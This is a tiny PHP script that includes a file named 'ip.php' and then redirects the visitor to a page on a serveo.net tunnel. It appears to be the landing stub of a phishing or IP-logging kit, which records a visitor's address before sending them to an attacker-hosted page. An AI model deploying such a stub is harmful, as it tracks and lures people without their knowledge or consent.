<?php
include 'ip.php';
header('Location: https://presumo.serveo.net/true.html');
exit
?>
